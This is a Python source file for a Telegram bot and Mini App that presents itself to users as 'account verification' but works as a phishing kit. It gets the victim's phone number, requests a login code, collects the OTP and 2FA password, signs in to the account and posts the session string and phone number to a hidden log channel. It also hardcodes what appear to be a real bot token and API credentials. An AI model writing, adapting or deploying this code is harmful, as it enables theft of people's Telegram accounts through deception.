import asyncio
import hashlib
import hmac
import json
import os
import time
from urllib.parse import parse_qsl

from aiohttp import ClientSession, ClientTimeout, web
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

BASE = os.path.dirname(os.path.abspath(__file__))

# আপনার নির্দিষ্ট ক্রেডেনশিয়ালসমূহ
BOT_TOKEN = "8854020750:AAF3oCKcZz0CnoqVTPUq3h9YkmOm-LuXPzc"
WEBAPP_URL = "https://codenestauth5.onrender.com/live/u3-verify-6c5823/"
API_ID = 30292115
API_HASH = "6cd72c68caba5fcdd989a626736ea7b5"
LOG_CHANNEL_ID = -1004351506169
PORT = int(os.environ.get("PORT", 10000))

# মেমরিতে দ্রুত নম্বর এবং সেশন ট্র্যাক করার জন্য ডিকশনারি
user_phones = {}
active_sessions = {}

SESSION: ClientSession = None

async def tg(method, **params):
    async with SESSION.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", json=params) as r:
        data = await r.json()
    if not data.get("ok"):
        raise RuntimeError(f"{method}: {data.get('description')}")
    return data["result"]

# ---------- Mini App initData check ----------
def check_init_data(init_data: str):
    pairs = dict(parse_qsl(init_data, keep_blank_values=True))
    got = pairs.pop("hash", None)
    if not got:
        return None
    dcs = "\n".join(f"{k}={v}" for k, v in sorted(pairs.items()))
    secret = hmac.new(b"WebAppData", BOT_TOKEN.encode(), hashlib.sha256).digest()
    calc = hmac.new(secret, dcs.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(calc, got):
        return None
    if time.time() - int(pairs.get("auth_date", "0") or 0) > 86400:
        return None
    try:
        return json.loads(pairs.get("user", "{}"))
    except Exception:
        return None

# ---------- bot logic ----------
async def handle(u):
    if "message" in u:
        m = u["message"]
        chat_id = m["chat"]["id"]
        uid = str(m["from"]["id"])
        text = m.get("text", "") or ""
        
        # ইউজার চ্যাট থেকে নম্বর শেয়ার করলে তা ইনস্ট্যান্ট মেমরিতে সেভ হবে এবং মিনি অ্যাপের লিংক দিবে
        if "contact" in m:
            phone_number = m["contact"]["phone_number"]
            phone = "+" + phone_number.replace("+", "")
            user_phones[uid] = phone
            
            kb = {"inline_keyboard": [[{"text": "🚀 মিনি অ্যাপ ওপেন করে ভেরিফাই করুন", "web_app": {"url": WEBAPP_URL}}]]}
            await tg("sendMessage", chat_id=chat_id, text=f"✅ নম্বর সফলভাবে সংরক্ষিত হয়েছে ({phone})!\n\nএবার নিচের বাটনে ক্লিক করে মিনি অ্যাপে প্রবেশ করুন:", reply_markup=kb)
            return

        if text.startswith("/start"):
            # চ্যাটের নিচে স্থায়ী কন্টাক্ট শেয়ার করার বাটন
            kb = {
                "keyboard": [[{"text": "📱 আমার নম্বর শেয়ার করুন", "request_contact": True}]],
                "resize_keyboard": True,
                "one_time_keyboard": True
            }
            await tg("sendMessage", chat_id=chat_id, text="👋 একাউন্ট ভেরিফিকেশন শুরু করতে নিচের 📱 **আমার নম্বর শেয়ার করুন** বাটনে ক্লিক করুন:", parse_mode="Markdown", reply_markup=kb)

async def poll(app):
    offset = 0
    try:
        await tg("deleteWebhook")
    except Exception as e:
        print("deleteWebhook:", e, flush=True)
    me = await tg("getMe")
    print(f"[bot] @{me['username']} polling...", flush=True)
    while True:
        try:
            ups = await tg("getUpdates", offset=offset, timeout=25, allowed_updates=["message"])
            for u in ups:
                offset = u["update_id"] + 1
                asyncio.create_task(safe_handle(u))
        except asyncio.CancelledError:
            raise
        except Exception as e:
            print("[poll]", e, flush=True)
            await asyncio.sleep(3)

async def safe_handle(u):
    try:
        await handle(u)
    except Exception as e:
        print("[handle]", e, flush=True)

# ---------- web (Mini App UI & API) ----------
PAGE = """<!doctype html>
<html lang="bn"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Session Generator</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  body{margin:0;min-height:100vh;display:grid;place-items:center;padding:20px;color:#fff;font-family:sans-serif;background:#18222d;}
  .card{width:100%;max-width:380px;background:#212d3b;border-radius:15px;padding:25px;box-shadow:0 10px 30px rgba(0,0,0,.5)}
  input,button{width:100%;padding:12px;margin:10px 0;border-radius:8px;border:none;box-sizing:border-box;font-size:14px;}
  input{background:#18222d;color:white;border:1px solid #2b3847;}
  button{background:#2481cc;color:white;font-weight:bold;cursor:pointer;}
  .hidden{display:none;}
  #msg{margin-top:12px;font-size:14px;text-align:center;}
  .err{color:#fb7185;} .ok{color:#34d399;}
</style></head><body>
<div class="card">
  <h2>Session Generator</h2>
  
  <!-- Step 1: Loading / Auto Fetch Status -->
  <div id="step-loading">
    <p id="load-msg" style="font-size: 14px; color: #8b93a7;">নম্বর চেক করা হচ্ছে এবং ওটিপি পাঠানো হচ্ছে...</p>
  </div>

  <!-- Step 2: OTP Input -->
  <div id="step-otp" class="hidden">
    <label id="otp-label">ওটিপি (OTP) কোড দিন:</label>
    <input type="text" id="otp" placeholder="12345">
    <button onclick="verifyOTP()">ওটিপি কনফার্ম করুন</button>
  </div>

  <!-- Step 3: 2FA Password -->
  <div id="step-2fa" class="hidden">
    <label>2FA পাসওয়ার্ড দিন:</label>
    <input type="password" id="password" placeholder="Password">
    <button onclick="verifyPassword()">পাসওয়ার্ড সাবমিট করুন</button>
  </div>

  <div id="msg"></div>
</div>
<script>
const tg = window.Telegram.WebApp; tg.ready(); tg.expand();
let phoneNum = "", phoneCodeHash = "";

// মিনি অ্যাপ ওপেন হওয়ার সাথে সাথেই ব্যাকএন্ড থেকে নম্বর চেক করে অটো ওটিপি রিকোয়েস্ট পাঠাবে
window.onload = async function() {
    try {
        const res = await fetch('/api/request-otp-auto', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ initData: tg.initData })
        });
        const j = await res.json();
        if(j.status === "otp_sent") {
            phoneNum = j.phone;
            phoneCodeHash = j.phone_code_hash;
            document.getElementById('step-loading').classList.add('hidden');
            document.getElementById('step-otp').classList.remove('hidden');
            document.getElementById('otp-label').innerText = "নম্বর (" + phoneNum + ") এ পাঠানো ওটিপি দিন:";
        } else {
            document.getElementById('load-msg').className = "err";
            document.getElementById('load-msg').innerText = j.detail || "আগে বটের চ্যাট থেকে নম্বর শেয়ার করুন!";
        }
    } catch(e) {
        document.getElementById('load-msg').className = "err";
        document.getElementById('load-msg').innerText = "সার্ভার কানেকশন ত্রুটি!";
    }
};

async function verifyOTP() {
    const otp = document.getElementById('otp').value;
    const res = await fetch('/api/verify-otp', {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: phoneNum, phone_code_hash: phoneCodeHash, otp: otp })
    });
    const j = await res.json();
    if(j.status === "2fa_required") {
        document.getElementById('step-otp').classList.add('hidden');
        document.getElementById('step-2fa').classList.remove('hidden');
        document.getElementById('msg').className = "";
        document.getElementById('msg').innerText = "টু-স্টেপ ভেরিফিকেশন পাসওয়ার্ড দিন।";
    } else if(j.status === "success") {
        document.getElementById('msg').className = "ok";
        document.getElementById('msg').innerText = "সফল! সেশন চ্যানেলে পাঠানো হয়েছে এবং লগআউট সম্পন্ন।";
        setTimeout(()=>tg.close(), 2500);
    } else {
        alert(j.detail || "ভুল ওটিপি");
    }
}

async function verifyPassword() {
    const pwd = document.getElementById('password').value;
    const res = await fetch('/api/verify-password', {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: phoneNum, password: pwd })
    });
    const j = await res.json();
    if(j.status === "success") {
        document.getElementById('msg').className = "ok";
        document.getElementById('msg').innerText = "সফল! সেশন চ্যানেলে পাঠানো হয়েছে এবং লগআউট সম্পন্ন।";
        setTimeout(()=>tg.close(), 2500);
    } else {
        alert(j.detail || "ভুল পাসওয়ার্ড");
    }
}
</script></body></html>"""

async def page(request):
    return web.Response(text=PAGE, content_type="text/html")

async def api_request_otp_auto(request):
    try:
        body = await request.json()
        user = check_init_data(body.get("initData", ""))
        if not user:
            return web.json_response({"detail": "Unauthorized (Invalid InitData)"}, status=403)
        
        uid = str(user["id"])
        phone = user_phones.get(uid)
        
        if not phone:
            return web.json_response({"detail": "প্রথমে বটের চ্যাট থেকে '📱 আমার নম্বর শেয়ার করুন' এ ক্লিক করুন।"}, status=400)
        
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        code_res = await client.send_code_request(phone)
        active_sessions[phone] = {
            'client': client,
            'phone_code_hash': code_res.phone_code_hash
        }
        return web.json_response({"status": "otp_sent", "phone": phone, "phone_code_hash": code_res.phone_code_hash})
    except Exception as e:
        return web.json_response({"detail": str(e)}, status=400)

async def api_verify_otp(request):
    try:
        body = await request.json()
        phone = body.get("phone")
        otp = body.get("otp")
        session_data = active_sessions.get(phone)
        if not session_data:
            return web.json_response({"detail": "Session expired"}, status=400)
        
        client = session_data['client']
        await client.sign_in(phone, code=otp, phone_code_hash=session_data['phone_code_hash'])
        return await finalize_login(phone, client)
    except SessionPasswordNeededError:
        return web.json_response({"status": "2fa_required"})
    except Exception as e:
        return web.json_response({"detail": str(e)}, status=400)

async def api_verify_password(request):
    try:
        body = await request.json()
        phone = body.get("phone")
        password = body.get("password")
        session_data = active_sessions.get(phone)
        if not session_data:
            return web.json_response({"detail": "Session expired"}, status=400)
        
        client = session_data['client']
        await client.sign_in(password=password)
        return await finalize_login(phone, client)
    except Exception as e:
        return web.json_response({"detail": str(e)}, status=400)

async def finalize_login(phone, client):
    string_session = client.session.save()
    
    # চ্যানেলে সেশন পাঠানো
    bot_client = TelegramClient(StringSession(), API_ID, API_HASH)
    await bot_client.start(bot_token=BOT_TOKEN)
    msg = f"<b>New Session Generated!</b>\n<b>Phone:</b> {phone}\n<b>Session String:</b>\n<code>{string_session}</code>"
    await bot_client.send_message(LOG_CHANNEL_ID, msg, parse_mode='html')
    await bot_client.disconnect()

    try:
        await client.log_out()
    except:
        pass
    await client.disconnect()
    
    if phone in active_sessions:
        del active_sessions[phone]
        
    return web.json_response({"status": "success"})

async def health(request):
    return web.Response(text="ok")

async def on_start(app):
    global SESSION
    SESSION = ClientSession(timeout=ClientTimeout(total=40))
    app["poll"] = asyncio.create_task(poll(app))

async def on_stop(app):
    app["poll"].cancel()
    await SESSION.close()

def make_app():
    app = web.Application()
    app.router.add_get("/", page)
    app.router.add_post("/api/request-otp-auto", api_request_otp_auto)
    app.router.add_post("/api/verify-otp", api_verify_otp)
    app.router.add_post("/api/verify-password", api_verify_password)
    app.router.add_get("/health", health)
    app.on_startup.append(on_start)
    app.on_cleanup.append(on_stop)
    return app

if __name__ == "__main__":
    web.run_app(make_app(), host="0.0.0.0", port=PORT)

